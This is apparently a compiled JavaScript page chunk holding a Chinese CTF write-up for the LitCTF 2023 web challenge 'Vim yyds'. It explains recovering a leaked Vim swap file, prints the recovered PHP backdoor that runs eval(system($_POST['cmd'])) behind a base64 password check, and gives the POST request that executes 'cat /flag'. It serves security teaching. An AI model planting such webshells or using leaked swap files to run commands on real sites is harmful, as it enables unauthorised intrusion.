(window.webpackJsonp=window.webpackJsonp||[]).push([[136],{660:function(t,s,a){"use strict";a.r(s);var e=a(2),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("Boxx"),t._v(" "),s("p",[t._v("[LitCTF 2023]这套题是Web方向入门题单，这是我的第18题")]),t._v(" "),s("p"),s("div",{staticClass:"table-of-contents"},[s("ul",[s("li",[s("a",{attrs:{href:"#题目描述-漏-漏了"}},[t._v("题目描述：漏…漏了！")])]),s("li",[s("a",{attrs:{href:"#考点1-信息泄露"}},[t._v("考点1：信息泄露")])]),s("li",[s("a",{attrs:{href:"#考点2-linux常用命令"}},[t._v("考点2：Linux常用命令")])]),s("li",[s("a",{attrs:{href:"#预期解"}},[t._v("预期解：")])])])]),s("p"),t._v(" "),s("ul",[s("li",[t._v("题单【"),s("a",{attrs:{href:"https://www.nssctf.cn/problem/3861",target:"_blank",rel:"noopener noreferrer"}},[t._v("传送门"),s("OutboundLink")],1),t._v("】")]),t._v(" "),s("li",[t._v("主办方WriteUP【"),s("a",{attrs:{href:"https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf",target:"_blank",rel:"noopener noreferrer"}},[t._v("传送门"),s("OutboundLink")],1),t._v("】")]),t._v(" "),s("li",[t._v("主办方WriteUP视频【"),s("a",{attrs:{href:"https://www.bilibili.com/video/BV1sm4y187EK",target:"_blank",rel:"noopener noreferrer"}},[t._v("传送门"),s("OutboundLink")],1),t._v("】")])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("题目编号")]),t._v(" "),s("th",[t._v("题目名称")]),t._v(" "),s("th",[t._v("题目方向")]),t._v(" "),s("th",[t._v("难度")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("3866")]),t._v(" "),s("td",[t._v("Vim yyds")]),t._v(" "),s("td",[t._v("Web")]),t._v(" "),s("td",[t._v("1")])])])]),t._v(" "),s("h1",{attrs:{id:"题目18-vim-yyds"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#题目18-vim-yyds"}},[t._v("#")]),t._v(" 题目18：Vim yyds")]),t._v(" "),s("h3",{attrs:{id:"题目描述-漏-漏了"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#题目描述-漏-漏了"}},[t._v("#")]),t._v(" 题目描述：漏…漏了！")]),t._v(" "),s("h3",{attrs:{id:"考点1-信息泄露"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#考点1-信息泄露"}},[t._v("#")]),t._v(" 考点1：信息泄露")]),t._v(" "),s("h3",{attrs:{id:"考点2-linux常用命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#考点2-linux常用命令"}},[t._v("#")]),t._v(" 考点2：Linux常用命令")]),t._v(" "),s("h3",{attrs:{id:"预期解"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#预期解"}},[t._v("#")]),t._v(" 预期解：")]),t._v(" "),s("p",[t._v("进入页面后，发现只有一个VIm的图标，结合题目描述，可以大致想到是Vim缓存文件泄露")]),t._v(" "),s("img",{staticStyle:{zoom:"50%"},attrs:{src:"/img/essay/image-20241126190916569.png",alt:"image-20241126190916569"}}),t._v(" "),s("blockquote",[s("p",[t._v("Vim的备份文件后缀/Vim缓存文件后缀")]),t._v(" "),s("p",[t._v("使用 vim 时会创建临时缓存文件，关闭vim时缓存文件会被删除。如果vim 异常 退出，这时候未处理缓存文件，就会导致可以通过缓存文件查看文件内容。 第一次意外退出产生的备份文件名为：.filename.swp 第二次意外退出产生的备份文件名为：.filename.swo 第三次意外退出产生的备份文件名为：.filename.swn")])]),t._v(" "),s("p",[t._v("由此我们可以访问.index.php.swp，这个文件就是vim编辑后的缓存文件，在下载过后（有可能杀毒软件会弹窗），我们用010Editor或者其他编辑器打开，找到关键代码")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$password")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"Give_Me_Your_Flag"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'password'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("base64_encode")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$password")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'cmd'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("p",[t._v('这段代码的意思是，我们用POST方法请求，并且传入一个名为“password”的参数，参数值必须为用base64加密过后的"Give_Me_Your_Flag"，这样才能触发后边的木马，也就是传入一个名为cmd的参数，这个参数值即为命令。')]),t._v(" "),s("p",[t._v("我们打开HackBar，像该网站发送请求")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("#地址\nhttp://node4.anna.nssctf.cn:28004/\n#参数\npassword=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=cat /flag\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br")])]),s("p",[s("img",{attrs:{src:"/img/essay/image-20241126193237784.png",alt:"image-20241126193237784"}})])],1)}),[],!1,null,null,null);s.default=n.exports}}]);